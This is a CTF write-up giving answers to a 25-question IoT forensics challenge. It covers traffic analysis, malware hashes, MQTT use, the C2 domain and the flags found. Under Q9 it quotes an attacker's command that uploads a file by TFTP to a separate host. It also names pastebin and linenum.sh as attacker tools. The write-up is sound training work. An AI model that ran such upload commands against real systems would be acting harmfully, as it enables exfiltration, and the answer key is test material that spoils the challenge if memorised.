---
title: "Internet of Trouble — Learn-it CTF"
description: "A 25-question IoT forensics challenge involving network traffic analysis, malware reversing, and multiple compromised devices."
pubDate: 2025-02-28
tags: ["forensics", "iot", "wireshark", "reversing", "learn-it"]
---

**Category:** Forensics / IoT / Reverse Engineering
**Platform:** Learn-it CTF

A deep forensics challenge involving a compromised IoT network. Multiple devices, protocols, and malware samples. Here are the solutions for each question.

---

**Q1. Attacker IP addresses:**

```
192.168.230.10
192.168.230.53
```

---

**Q2. IoT device type attacked first:**

Filter by HTTP — the device is a **Firewall**.

---

**Q3. Hash of the command issued by the legitimate user:**

Command: `iptables -A INPUT -p tcp --dport 23 -j DROP`

```bash
echo -n "iptables -A INPUT -p tcp --dport 23 -j DROP" | sha256sum
# b88f9051e1415e85e08251bd2a728d4f6751a75ea2fe9aa5092500d846d0f54b
```

---

**Q4. Version of the text-based browser used by the attacker:**

`2.8.9`

---

**Q5. Hash of malware that infected device from Q2:**

Filter `tcp.port == 23`, follow TCP streams, find unusual commands.

`7d01b18393599147f934d1a40fc4fff67c1cde336d1f4f736e19cd7b35efee6b`

---

**Q6. Name and location of the saved malware file (sha256):**

Path: `/tmp/nothing`
SHA256: `0740bd6c5ea9a8fa8cacd2bdf2f391876eba86b172f1c7e9d4e71bb91f1c93c8`

---

**Q7. Type of second attacked device:**

Ignore the first device IPs. The remaining traffic uses **NBSS** protocol — the device is a **Bulb**.

---

**Q8. Packet number that returns an error:**

Filter: `!(ip.addr == 10.200.0.14)` → Packet **10** returns an error.

---

**Q9. Hash of the firewall bypass command:**

TCP stream 16, packet 226:

```bash
cd / ; TFTP_SERVER="10.200.0.15"; TFTP_PORT="69"; FILE_TO_UPLOAD="/test.sh"; \
echo -e "put $FILE_TO_UPLOAD\nquit" | tftp $TFTP_SERVER $TFTP_PORT
```

SHA256: `728a94260fffdd5140021e93ac9455b4240b4febeb5b9f5bb7bf58b00854f14f`

---

**Q10. Protocol used to interact with the second device's filesystem:**

**MQTT**

---

**Q11. MQTT topic used:**

`smart_bulb/cmd`

---

**Q12. Hash of malware used on second device:**

Filter `tcp.port == 445`, follow stream, extract the command and hash it:

`2a2211546f2ac4011bfabde29f0cb785aec19c662c835005a479d69365062077`

---

**Q13. Site used to download a payload:**

`pastebin.com`

---

**Q14. Privilege escalation utility used:**

`linenum.sh`

---

**Q15. Domains used by attacker (sha256(domain1_domain2)):**

Domains: `data-packages.local` and `iotrepoupdates.local`

Combined: `data-packages.local_iotrepoupdates.local`

SHA256: `abb22caa3710e6d497bcab1f061adcc1740041f4dd0d8ccb253fad9851634a5b`

---

**Q16. Function in malware from Q5 that detects virtualization:**

`is_vm`

---

**Q17. Folder searched by malware from Q5 for sensitive data:**

`/tmp`

---

**Q18. Delay per exfiltration attempt (ms):**

`3000`

---

**Q19. What does malware from Q5 use to exfiltrate data:**

**CPU** (side-channel exfiltration via CPU usage)

---

**Q20. Key used for URL generation in malware from Q12:**

`DcERdmBr`

---

**Q22. C2 domain:**

`iotrepoupdates.local`

---

**Q24. Packet that triggers exfiltration start:**

Filter: `(frame.number >= 408) && (ip.addr == 192.168.230.10) && (ip.addr == 10.200.0.14)` → Packet **408**.

---

## Flags found

```
LearnIT{You_got_it_now_find_the_other_1337_flags}   (Q29)
LearnIT{Nice_now_find_the_harder_flag}               (Q31)
LearnIT{catching_flags_like_newton_apples}           (Q27)
```

## Takeaways

- Filter aggressively by IP pairs to isolate attacker traffic.
- MQTT is a common IoT protocol — learn to read it in Wireshark.
- CPU-based covert channels are a real exfiltration technique in air-gapped environments.
- Always check DNS traffic for C2 domains.
